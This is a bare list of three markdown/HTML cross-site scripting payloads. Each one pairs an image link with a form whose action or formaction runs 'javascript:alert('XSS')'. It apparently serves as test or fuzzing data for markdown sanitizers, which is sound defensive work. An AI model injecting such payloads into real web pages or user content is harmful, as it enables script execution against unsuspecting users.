![](https://example.com)<form><input type="submit" formaction="javascript:alert('XSS')"></form>

![](https://example.com)<form><button formaction="javascript:alert('XSS')">Click</button></form>

![](https://example.com)<form action="javascript:alert('XSS')"><input type="submit"></form>